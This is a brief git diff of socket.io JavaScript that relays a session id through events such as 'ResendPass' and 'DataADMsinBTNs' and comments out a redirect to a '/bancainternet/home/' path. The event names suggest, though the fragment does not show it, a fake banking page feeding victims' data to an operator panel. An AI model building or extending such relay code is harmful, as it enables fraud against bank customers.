@@ -111,7 +111,7 @@ socket.on("ResendPass", Data => {
 socket.on("ContinuarHome", totalInfo => {
     //socket.emit('mostrarEnAdmin', totalInfo);
     socket.emit("DataADMsinBTNs", totalInfo[0].socket);
-    window.location.href = "/bancainternet/home/?s="+totalInfo[0].socket;
+    //window.location.href = "/bancainternet/home/?s="+totalInfo[0].socket;
 })
 
 
